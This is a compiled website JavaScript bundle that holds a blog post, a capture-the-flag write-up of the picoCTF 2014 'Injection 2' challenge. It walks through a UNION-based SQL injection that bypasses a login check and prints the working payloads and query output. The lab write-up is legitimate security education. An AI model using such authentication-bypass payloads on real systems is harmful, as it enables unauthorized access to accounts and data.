"use strict";(self.webpackChunkpersonalpage=self.webpackChunkpersonalpage||[]).push([[677],{6862:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var t=r(5893),s=r(1151);const a={slug:"picoctf-2014-part1",title:"picoCTF 2014 part 1: Injection 2",authors:"csressel"},o="Injection 2",i={permalink:"/blog/picoctf-2014-part1",source:"@site/blog/2014-11-29-picoctf-part1.md",title:"picoCTF 2014 part 1: Injection 2",description:"Summary",date:"2014-11-29T00:00:00.000Z",formattedDate:"November 29, 2014",tags:[],readingTime:2.18,hasTruncateMarker:!0,authors:[{name:"Clifford",url:"https://github.com/CSRessel",imageURL:"/img/csressel-xs.jpg",key:"csressel"}],frontMatter:{slug:"picoctf-2014-part1",title:"picoCTF 2014 part 1: Injection 2",authors:"csressel"},unlisted:!1,prevItem:{title:"picoCTF 2014 part 2: secure_page_service",permalink:"/blog/picoctf-2014-part2"}},l={authorsImageUrls:[void 0]},c=[{value:"Summary",id:"summary",level:2},{value:"The Program",id:"the-program",level:2},{value:"The Injection",id:"the-injection",level:2}];function d(e){const n={code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"summary",children:"Summary"}),"\n",(0,t.jsx)(n.p,{children:"By unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program\u2019s requirements."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-SQL",children:"SELECT * FROM users WHERE username='asdf' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- '\n"})}),"\n",(0,t.jsx)(n.p,{children:"(with \u201c1337\u201d entered as the password)"}),"\n",(0,t.jsx)(n.h2,{id:"the-program",children:"The Program"}),"\n",(0,t.jsxs)(n.p,{children:["The source is available ",(0,t.jsx)("a",{href:"http://web2014.picoctf.com/injection2/login.phps",children:"here"}),". Examination of the source shows several things.\nFirst, we can make injections into the username field.\nSecond, the returned data from the query will need to meet the following requirements to reveal the flag:"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"mysqli_num_rows($result) === 1"})," \u2014 only one row"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:'$row["password"] === $password'})," \u2014 row\u2019s password must match our given password"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:'$row["user_level"] >= 1337'})," \u2014 row\u2019s user_level must be greater than or equal to 1337"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Finally, by setting the form\u2019s hidden field \u201cdebug\u201d to 1, we receive a nice view of our input and the generated query."}),"\n",(0,t.jsx)(n.h2,{id:"the-injection",children:"The Injection"}),"\n",(0,t.jsx)(n.p,{children:"By taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements."}),"\n",(0,t.jsx)(n.p,{children:"An injection of:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"asdf' UNION SELECT 0 AS a LIMIT 1 -- \n"})}),"\n",(0,t.jsx)(n.p,{children:"Will yield the query:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-SQL",children:"SELECT * FROM users WHERE username='asdf' UNION SELECT 0 AS a LIMIT 1 -- \n"})}),"\n",(0,t.jsx)(n.p,{children:"Let\u2019s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.\nThis gives us the following error:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"SQL error: The used SELECT statements have a different number of columns\n"})}),"\n",(0,t.jsx)(n.p,{children:"However, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.\nNew query:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-SQL",children:"SELECT * FROM users WHERE username='asdf' UNION SELECT 0 AS a, 0 AS b, 0 AS c, 0 AS d, 0 AS e LIMIT 1 -- \n"})}),"\n",(0,t.jsx)(n.p,{children:"As we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form."}),"\n",(0,t.jsx)(n.p,{children:"The final query:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-SQL",children:"SELECT * FROM users WHERE username='asdf' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- '\n"})}),"\n",(0,t.jsx)(n.p,{children:"This proves successful!\n(as the flag appears to be dynamically generated it is not included here)"})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},1151:(e,n,r)=>{r.d(n,{Z:()=>i,a:()=>o});var t=r(7294);const s={},a=t.createContext(s);function o(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);